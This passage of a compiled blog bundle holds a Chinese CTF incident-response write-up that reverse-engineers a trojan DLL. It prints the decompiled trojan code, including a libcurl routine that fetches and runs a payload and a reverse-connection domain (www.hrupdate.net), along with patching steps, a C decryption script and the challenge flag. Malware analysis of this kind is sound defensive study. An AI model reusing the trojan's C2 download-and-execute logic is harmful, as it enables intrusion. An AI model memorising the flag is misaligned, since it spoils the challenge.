-37;\n                v32[21] = 51;\n                v32[22] = -119;\n                v32[23] = 31;\n                v32[24] = -5;\n                v32[25] = -10;\n                v32[26] = 97;\n                v32[27] = 94;\n                v32[28] = 18;\n                v32[29] = 6;\n                v32[30] = -98;\n                v32[31] = 21;\n                for ( n = 0; n < v28; ++n )\n                {\n                    v38 = 0;\n                    if ( n % 3 )\n                    {\n                        if ( n % 5 )\n                        {\n                            if ( n % 7 )\n                                v38 = n % 0x20;\n                            else\n                                v38 = 3 * n % 0x20;\n                        }\n                        else\n                        {\n                            v38 = (2 * n + 1) % 0x20;\n                        }\n                    }\n                    else\n                    {\n                        v38 = 2 * n % 0x20;\n                    }\n                    v41[n] ^= (int)(unsigned __int8)v32[v38] >> (v38 % 6);\n                }\n                std::ostream::write(v48, v41, v28, 0);\n                v17 = &v10;\n                sub_100042D0(v41);\n                sub_100019F0(v33, v51, v10);\n                Block = v41;\n                j_j_free(v41);\n                if ( Block )\n                {\n                    v41 = (char *)33059;\n                    v25 = 33059;\n                }\n                else\n                {\n                    v25 = 0;\n                }\n                LOBYTE(v64) = 2;\n                sub_10002700(v49);\n            }\n            LOBYTE(v64) = 1;\n            sub_100026D0(v48);\n        }\n        LOBYTE(v64) = 0;\n        sub_10002680(v47);\n    }\n    Sleep(0x493E0u);\n    v64 = -1;\n    sub_100042B0(v51);\n}\n'})}),"\n",(0,d.jsx)(e.p,{children:"\u76f4\u63a5\u4e0a\u52a8\u6001\u8c03\u8bd5\uff0c\u5c06\u90a3\u51e0\u4e2a if \u5224\u65ad\u5168\u90e8\u65e0\u6548\u5316\uff0c\u8fdb\u5165\u5230\u540e\u7eed\u7684 flag \u52a0\u5bc6\u90e8\u5206"}),"\n",(0,d.jsxs)(e.p,{children:["\u52a8\u6001\u8c03\u8bd5\u7684\u8bdd\uff0c\u9700\u8981\u6ce8\u610f\u5230 ",(0,d.jsx)(e.code,{children:"sub_10001B00"})," \u51fd\u6570"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-c",children:'int __cdecl sub_10001B00(int a1, int a2)\n{\n    int v2; // eax\n    int v4; // [esp+0h] [ebp-8h]\n    int v5; // [esp+4h] [ebp-4h]\n\n    v4 = 0;\n    v5 = curl_easy_init();\n    if ( v5 )\n    {\n        curl_easy_setopt(v5, 10002, a1);\n        curl_easy_setopt(v5, 52, 1);\n        curl_easy_setopt(v5, 10001, a2);\n        curl_easy_setopt(v5, 64, 0);\n        curl_easy_setopt(v5, 81, 0);\n        curl_easy_setopt(v5, 20011, sub_100019D0);\n        v4 = curl_easy_perform(v5);\n        if ( v4 )\n        {\n            v2 = sub_100056A0(std::cerr, "payload exec Fail");\n            std::ostream::operator<<(v2, sub_10005990);\n        }\n        curl_easy_cleanup(v5);\n    }\n    return v4;\n}\n'})}),"\n",(0,d.jsxs)(e.p,{children:["\u52a8\u6001\u8c03\u8bd5\uff0c\u53ef\u4ee5\u5728 IDA \u4e2d\uff0c\u4f7f\u7528 ",(0,d.jsx)(e.code,{children:"rundll32.exe"})," \u6765\u5b9e\u73b0\u8c03\u8bd5"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(57495).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsxs)(e.p,{children:["\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u5927\u9a6c\u7684\u8fd0\u884c\u4f9d\u8d56 libcurl \u5e93\uff0c\u5efa\u8bae\u4ece ",(0,d.jsx)(e.code,{children:"vmdk"})," \u68c0\u6750\u7684 ",(0,d.jsx)(e.code,{children:"Root\\Documents and Settings\\admin\\AppData\\Roaming\\HRSword5-green\\libcurl.dll"})," \u4e2d\u63d0\u53d6\u51fa\u6765\uff0c\u4ee5\u514d\u52a8\u8c03\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7f3a\u5c11\u4f9d\u8d56\u5e93\u7684\u62a5\u9519"]}),"\n",(0,d.jsx)(e.p,{children:"\u4e00\u6b65\u4e00\u6b65\u8ddf\u8fdb\u4e0b\u53bb"}),"\n",(0,d.jsxs)(e.p,{children:["\u89e3\u5bc6 ",(0,d.jsx)(e.code,{children:"flag.docx"})," \u8def\u5f84"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(36672).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u89e3\u5bc6\u4e34\u65f6\u6587\u4ef6\u8def\u5f84"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(69650).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u89e3\u5bc6\u53cd\u8fde\u57df\u540d"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(81903).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsxs)(e.p,{children:["\u4e3a\u4e86\u5904\u7406\u5927\u9a6c\u8fde\u63a5\u670d\u52a1\u5668\u7684\u884c\u4e3a\uff0c\u53ef\u80fd\u4f1a\u60f3\u7740\u5728\u672c\u5730\u7684 ",(0,d.jsx)(e.code,{children:"hosts"})," \u6587\u4ef6\u8fdb\u884c\u63a5\u7ba1 ",(0,d.jsx)(e.code,{children:"www.hrupdate.net"})," \u7684\u89e3\u6790\u5230\u672c\u5730\uff0c\u4f46\u662f\u63a5\u7ba1\u4f1a\u65e0\u6548\uff0c\u53ef\u80fd\u662f\u7531\u4e8e ",(0,d.jsx)(e.code,{children:"libcurl"})," \u5176\u672c\u8eab\u673a\u5236\u5f71\u54cd\uff0c\u8fd8\u662f\u76f4\u63a5\u5904\u7406 if \u90e8\u5206\u6bd4\u8f83\u597d"]}),"\n",(0,d.jsx)(e.p,{children:"\u9700\u8981\u5904\u7406\u7684\u662f\u4e0b\u56fe\u7684\u7ea2\u6846\u90e8\u5206"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(26516).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u53cd\u6c47\u7f16\u754c\u9762\u6ca1\u529e\u6cd5\u8fdb\u884c patch \u64cd\u4f5c\uff0c\u8fdb\u5165\u6c47\u7f16\u754c\u9762"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(39759).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsxs)(e.p,{children:["\u5206\u60c5\u51b5\u6765\u770b\uff0c\u53d6\u51b3\u4e8e if \u7684\u7ed3\u6784\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u76f4\u63a5 ",(0,d.jsx)(e.code,{children:"nop"})," \u6389\uff0c\u4e5f\u53ef\u4ee5\u5c1d\u8bd5 ",(0,d.jsx)(e.code,{children:"Force Jump"})]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(53856).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(83127).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u5c06\u8fd9\u90e8\u5206\u7684 if \u5224\u65ad\u5904\u7406\u6389 (\u4e3b\u8981\u662f\u670d\u52a1\u5668\u8bf7\u6c42\u7684\u8fd9\u4e9b\u5224\u65ad) \u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u7ee7\u7eed\u5411\u4e0b\u8ddf\u8fdb"}),"\n",(0,d.jsxs)(e.p,{children:["\u7136\u540e\u5c31\u662f\u5bf9 ",(0,d.jsx)(e.code,{children:"flag.docx"})," \u8fdb\u884c\u8bfb\u53d6"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(18294).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsxs)(e.p,{children:["\u5728\u52a0\u5bc6\u4e4b\u524d\uff0c\u53d8\u91cf ",(0,d.jsx)(e.code,{children:"v43"})," \u50a8\u5b58\u7684\u662f ",(0,d.jsx)(e.code,{children:"flag.docx"})," \u8bfb\u53d6\u5230\u7684\u6570\u636e"]}),"\n",(0,d.jsx)(e.admonition,{type:"warning",children:(0,d.jsx)(e.p,{children:"\u7ecf\u8fc7\u6f2b\u957f\u7684\u78b0\u58c1\u548c\u81ea\u6211\u6000\u7591\u4e4b\u540e"})}),"\n",(0,d.jsx)(e.p,{children:"\u9759\u6001\u5206\u6790\u4e5f\u53ef\u4ee5\uff0c\u8fd9\u4e00\u5757\u7684\u52a0\u5bc6\u4e0d\u662f\u5f88\u590d\u6742\uff0c\u5c31\u662f\u5f02\u6216\u7684 key \u662f\u6839\u636e\u957f\u5ea6\u52a8\u6001\u7684\u800c\u5df2"}),"\n",(0,d.jsx)(e.p,{children:"\u52a8\u6001\u4e5f\u53ef\u4ee5\uff0c\u4e0d\u8fc7\u662f\u6309 3\u30015\u30017 \u500d\u6570\u7684\u5173\u7cfb\u8fdb\u884c\u903b\u8f91\u5206\u652f"}),"\n",(0,d.jsx)(e.p,{children:"\u81ea\u6211\u6298\u78e8\u4e86\uff0c\u4e0d\u8981\u60f3\u7740\u7528 Python \u6765\u7f16\u5199\u6240\u6709\u811a\u672c\uff0c\u9006\u5411\u5e94\u8be5\u56de\u5f52 c \u7684\u672c\u8d28 (\u4e0d\u60f3\u56de\u5f52\u6c47\u7f16\u662f\u8fd9\u6837\u7684)"}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsx)(e.p,{children:"\u8fd9\u4e00\u9898\u6ca1\u6709\u90a3\u4e48\u96be"}),"\n",(0,d.jsx)(e.p,{children:"\u6240\u6709\u7684\u903b\u8f91\u90fd\u662f\u660e\u9762\u4e0a\u7684\uff0c\u65e0\u8bba\u662f Base64 \u7f16\u89e3\u7801\uff0c\u8fd8\u662f\u5f02\u6216\uff0c\u8fd8\u662f\u4e2d\u95f4\u7684 key \u6570\u636e\uff0c\u90fd\u662f\u76f4\u63a5\u7ed9\u51fa\u7684"}),"\n",(0,d.jsx)(e.p,{children:"\u6ca1\u6709\u53cd\u8c03\u8bd5\uff0c\u6ca1\u6709\u53cd\u6c99\u7bb1\uff0c\u6ca1\u6709\u4efb\u4f55\u5bf9\u6297\u624b\u6bb5"}),"\n",(0,d.jsx)(e.p,{children:"\u4e2d\u95f4\u7684\u903b\u8f91\u8df3\u8fc7\u6709\u70b9\u6298\u78e8\uff0c\u4f46\u662f\u5e76\u975e nop \u4e0d\u6389\uff0c\u6216\u8005\u6539 jmp \u8df3\u4e0d\u8fc7\u53bb\u7684"}),"\n",(0,d.jsx)(e.p,{children:"\u552f\u4e00\u7684\u56f0\u96be\uff0c\u662f\u76f8\u4fe1\u81ea\u5df1\u80fd\u505a\u51fa\u6765"}),"\n"]}),"\n",(0,d.jsx)(e.p,{children:"\u5b8c\u6574\u7684\u89e3\u5bc6\u811a\u672c\u5982\u4e0b"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-c",children:'#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main()\n{\n    char v34[32];\n    memcpy(v34, ";=", 2);\n    v34[2] = -2;\n    v34[3] = 112;\n    v34[4] = 90;\n    v34[5] = -41;\n    v34[6] = -116;\n    v34[7] = 34;\n    v34[8] = -64;\n    v34[9] = 109;\n    v34[10] = -76;\n    v34[11] = -40;\n    v34[12] = 87;\n    v34[13] = 114;\n    v34[14] = -33;\n    v34[15] = -41;\n    v34[16] = 55;\n    v34[17] = 114;\n    v34[18] = -45;\n    v34[19] = 127;\n    v34[20] = -37;\n    v34[21] = 51;\n    v34[22] = -119;\n    v34[23] = 31;\n    v34[24] = -5;\n    v34[25] = -10;\n    v34[26] = 97;\n    v34[27] = 94;\n    v34[28] = 18;\n    v34[29] = 6;\n    v34[30] = -98;\n    v34[31] = 21;\n\n    FILE *fp = fopen("KbpD48.tmp", "r");\n    if (fp == NULL)\n    {\n        printf("Error opening file\\n");\n        return 1;\n    }\n    // \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5230 v43 \u6570\u7ec4\n    char *v43;\n    fseek(fp, 0, SEEK_END);\n    long fileSize = ftell(fp);\n    fseek(fp, 0, SEEK_SET);\n    v43 = (char *)malloc(fileSize + 1);\n    if (v43 == NULL)\n    {\n        printf("Memory allocation failed\\n");\n        fclose(fp);\n        return 1;\n    }\n    fread(v43, 1, fileSize, fp);\n    v43[fileSize] = \'\\0\'; // \u786e\u4fdd\u5b57\u7b26\u4e32\u4ee5 null \u7ed3\u5c3e\n    fclose(fp);\n\n    // \u8ba1\u7b97 v43 \u957f\u5ea6\n    long v30 = fileSize;\n    for (long n = 0; n < v30; ++n)\n    {\n        int v40 = 0;\n        if (n % 3)\n        {\n            if (n % 5)\n            {\n                if (n % 7)\n                    v40 = n % 0x20;\n                else\n                    v40 = 3 * n % 0x20;\n            }\n            else\n            {\n                v40 = (2 * n + 1) % 0x20;\n            }\n        }\n        else\n        {\n            v40 = 2 * n % 0x20;\n        }\n        v43[n] ^= v34[v40] >> (v40 % 6);\n    }\n    // printf("%s\\n", v43);\n    // \u5c06 v43 \u5185\u5bb9\u5199\u5165\u6587\u4ef6\n    FILE *fp2 = fopen("flag.docx", "w");\n    if (fp2 == NULL)\n    {\n        printf("Error opening file for writing\\n");\n        free(v43);\n        return 1;\n    }\n    fwrite(v43, 1, v30, fp2);\n    fclose(fp2);\n    free(v43);\n}\n'})}),"\n",(0,d.jsx)(e.p,{children:"\u5373\u53ef\u8e0f\u51fa\u6700\u540e\u7684\u4e00\u6b65"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(29102).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-flag",children:"FLAG{8474hj[fhh_87fp4520+_7rq4563}\n"})}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsx)(e.p,{children:"\u5e78\u597d\u6211\u4e00\u76f4\u6ca1\u6709\u653e\u5f03\u3002"}),"\n"]})]})}function h(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,d.jsx)(e,{...n,children:(0,d.jsx)(o,{...n})}):o(n)}},53856:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250500-200024-b6bf045b5c1ca16947e0826580ec9370.png"},83127:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250501-200121-af5940a50e375a5b5d993c719c918040.png"},38070:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250527-202702-2a169fe51a451105cf4825b3f5013ef7.png"},18294:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250529-182921-9ae48d0356307d52a52050af8b8c4ff6.png"},62238:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250532-203251-9b3500834a71a7edc797ba5d292c03da.png"},48447:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250537-113709-3ff95eb2fa9d6c88458055fcf88a46a9.png"},64364:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250537-203711-75cdaef9103920c7697bcfc831431bf0.png"},57495:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250548-134836-51485c68befabd9cfa2cea95b7539484.png"},36672:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250549-134946-28b2509377f6a2063e0f0490bfcd04ce.png"},81881:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250549-204949-dfba688c56ef8b425b6b0f738ec337cc.png"},69650:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250551-135133-077d3baacdebb4a574a75acb43b8a9fe.png"},29102:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250551-195113-b9db7723c80e66e3ba941f776d4423f5.png"},80812:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250551-205123-93dcee770bdccb51b3544acc8a730164.png"},94383:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250551-205145-8a78df096e526102e68a94aa8fc32743.png"},81903:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250552-135216-d15f268beb28246c174ce628651ead34.png"},55935:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250556-115658-f9dc1764ee65fa4c774c237416f50165.png"},26516:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250557-195759-70c36d2e54d9b55896aeaaf0b6e584b0.png"},39759:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250559-195934-266feffc07e1535b94f3634152a3ecd2.png"},28453:(n,e,s)=>{s.d(e,{R:()=>l,x:()=>r});var i=s(96540);const d={},c=i.createContext(d);function l(n){const e=i.useContext(c);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function r(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(d):n.components||d:l(n.components),i.createElement(c.Provider,{value:e},n.children)}},13161:n=>{n.exports=JSON.parse('{"permalink":"/Target-Machines-WriteUp/blog/2024CCB&CISCN-sc05","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2025-05-17-2024CCB&CISCN-sc05/index.md","source":"@site/blog/2025-05-17-2024CCB&CISCN-sc05/index.md","title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05","description":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05","date":"2025-05-17T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":14.21,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58\u58a8","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2024CCB&CISCN-sc05","title":"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05","authors":"Randark","toc_max_heading_level":5,"tags":["CTF","Incident-Response"]},"unlisted":false,"nextItem":{"title":"Hackthebox Battleground \u5999\u5999\u547d\u4ee4","permalink":"/Target-Machines-WriteUp/blog/Hackthebox Battleground Scripts"}}')}}]);